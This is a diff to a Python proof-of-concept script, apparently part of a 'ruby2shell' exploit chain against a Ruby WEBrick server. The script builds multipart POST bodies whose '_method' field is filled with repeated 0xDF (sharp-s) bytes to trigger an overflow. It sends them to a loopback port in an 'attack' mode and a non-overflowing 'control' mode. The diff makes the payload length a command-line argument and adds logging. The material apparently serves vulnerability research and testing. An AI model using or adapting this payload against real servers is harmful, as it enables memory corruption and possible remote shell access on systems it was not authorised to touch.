@@ -3,6 +3,7 @@
 
 Used by ruby2shell-webrick-keepalive.sh and ruby2shell-webrick-keep-watch.sh.
 Loopback only. mode=control sends a pure-sharp-s (non-overflowing) body.
+argv: mode fill port n (n defaults to the historical 572).
 """
 import os
 import socket
@@ -11,7 +12,7 @@ import sys
 mode = sys.argv[1] if len(sys.argv) > 1 else 'attack'
 fill = int(sys.argv[2]) if len(sys.argv) > 2 else 48
 port = int(sys.argv[3]) if len(sys.argv) > 3 else 4551
-n = 572
+n = int(sys.argv[4]) if len(sys.argv) > 4 else 572
 data = b'\xdf' * n if mode == 'control' else b'a' + b'\xdf' * (n - 1)
 method = (b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
           b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data)
@@ -48,7 +49,7 @@ s = socket.create_connection(('127.0.0.1', port), timeout=20)
 s.settimeout(20)
 status, resp = request(s, b'POST /not-a-route HTTP/1.1', body,
                        b'Content-Type: multipart/form-data; boundary=XB\r\n')
-print('request1 _method status=%s bytes=%s' % (status, len(resp or b'')))
+print('request1 _method N=%d status=%s bytes=%s' % (n, status, len(resp or b'')))
 plain = (b'--XB\r\nContent-Disposition: form-data; name="f"\r\n'
          b'Content-Type: text/plain\r\n\r\n' + (b'z' * 48) + b'\r\n--XB--\r\n')
 status, resp = request(s, b'POST /not-a-route HTTP/1.1', plain,
